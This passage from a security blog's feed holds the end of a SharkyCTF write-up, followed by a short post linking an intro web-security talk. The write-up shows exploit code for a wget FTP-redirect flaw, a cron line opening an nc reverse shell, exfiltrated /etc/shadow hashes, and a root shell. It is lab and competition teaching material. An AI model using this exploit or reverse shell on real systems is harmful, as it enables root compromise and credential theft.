+      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nothing to see here...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; 
+
+   &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; 
+   &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;301&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+   &lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'%s'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ftp://anonymous@%s:%s/.wgetrc'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FTP_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+   &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sending redirect to %s &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Location'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end_headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Next, we change the necessary host IP's and set the cron job to be installed.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HTTP_LISTEN_IP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'172.30.0.2'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;HTTP_LISTEN_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;FTP_HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'172.30.0.2'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;FTP_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ROOT_CRON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;* * * * * root nc 172.30.0.14 4446 -e /bin/bash &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Finally, we set up a listener, run the exploit, and wait for our shell!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@221f69d2ea9c:~# python wget-exploit.py 
+Ready? Is your FTP server running?
+FTP found open on 172.30.0.2:21. Let's go then
+
+Serving wget exploit on port 80...
+
+
+We have a volunteer requesting /52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/backup.zip by HEAD :)
+
+Uploading .wgetrc via ftp redirect vuln. It should land in /root 
+
+172.30.0.3 - - [15/May/2020 09:52:01] &amp;quot;HEAD /52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/backup.zip HTTP/1.1&amp;quot; 301 -
+Sending redirect to ftp://anonymous@172.30.0.2:21/.wgetrc 
+
+We have a volunteer requesting /52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/backup.zip by POST :)
+
+Received POST from wget, this should be the extracted /etc/shadow file: 
+
+---[begin]---
+ root:$6$6jQqx.BG$mNmP2hAVcAgZuSyVMhKTSl6B1f.5TCBJiWsFTfuziMA6i4.qlPcwevMDou/IJ80945vw527vTBh.GnWlIrMd2.:18391:0:99999:7:::
+daemon:*:18304:0:99999:7:::
+bin:*:18304:0:99999:7:::
+sys:*:18304:0:99999:7:::
+sync:*:18304:0:99999:7:::
+games:*:18304:0:99999:7:::
+man:*:18304:0:99999:7:::
+lp:*:18304:0:99999:7:::
+mail:*:18304:0:99999:7:::
+news:*:18304:0:99999:7:::
+uucp:*:18304:0:99999:7:::
+proxy:*:18304:0:99999:7:::
+www-data:*:18304:0:99999:7:::
+backup:*:18304:0:99999:7:::
+list:*:18304:0:99999:7:::
+irc:*:18304:0:99999:7:::
+gnats:*:18304:0:99999:7:::
+nobody:*:18304:0:99999:7:::
+systemd-timesync:*:18304:0:99999:7:::
+systemd-network:*:18304:0:99999:7:::
+systemd-resolve:*:18304:0:99999:7:::
+systemd-bus-proxy:*:18304:0:99999:7:::
+_apt:*:18304:0:99999:7:::
+sshd:*:18391:0:99999:7:::
+michael:$6$erpVP1YD$e3h56fuefKOtYJuIAuGdsEhGJAfX7l2GpyWaLRe20sZBPCsMtSNSAHjnW1m4mq1nqfg8L92OcTlMEbOUarjRH0:18391:0:99999:7:::
+ 
+---[eof]---
+
+
+Sending back a cronjob script as a thank-you for the file...
+It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And finally&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ nc -lnvp 4446
+listening on [any] 4446 ...
+connect to [172.30.0.14] from (UNKNOWN) [172.30.0.3] 60664
+whoami
+root
+ls
+backup.zip
+flag.txt
+cat flag.txt
+shkCTF{w0w_such_vu1n_a200100a86f1a805c08339cd16651f3d}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;This was a fun series of challenges that had a cool couple of exploits I had never seen before. I want to thank Magnussen/Nofix for creating them, Remsio who helped me with some VPN issues, and the whole SharkyCTF team for such a fun weekend. Can't wait to receive my prize for Hack The Box VIP :) - deluqs&lt;/p&gt;</content><author><name></name></author><category term="png" /><category term="webshell" /><category term="wget" /><category term="cron" /><category term="sharky" /><category term="ctf" /><summary type="html">Introduction User 1 Recon Finding Credentials Intended Way - Viewing Source Code Unintended Way - OSINT Exploiting PNG Upload Accessing the web shell Getting a shell User 2 Root Enum Exploit Root 2 Making life better Enum Explaining the exploit Executing the exploit Summary</summary></entry><entry><title type="html">Intro to Web Security</title><link href="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html" rel="alternate" type="text/html" title="Intro to Web Security" /><published>2020-04-26T11:30:00+10:00</published><updated>2020-04-26T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/04/26/intro-to-websec</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html">&lt;p&gt;This isn't so much a post, just a share of something I did. So last week I gave a talk to the &lt;a href=&quot;https://cybersquad.uqcloud.net/&quot;&gt;UQ Cyber Squad&lt;/a&gt; called &lt;strong&gt;&amp;quot;Introduction to Web Security&amp;quot;&lt;/strong&gt;. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of &lt;em&gt;WebSec for CTFs&lt;/em&gt;, since it serves as an easy entry point to those not familiar with the theory and tools, and it's an area I have some decent experience in.&lt;/p&gt;
 &lt;p&gt;That being said, here's the links:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://drive.google.com/open?id=1c37tw3RH1CqAYF_pu6lKc3SFGYe8HSDm&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://drive.google.com/open?id=1mTnQG0nP3FYmRiP8mfeoa7lDJzWTU9gs&quot;&gt;Slides&lt;/a&gt;&lt;/p&gt;
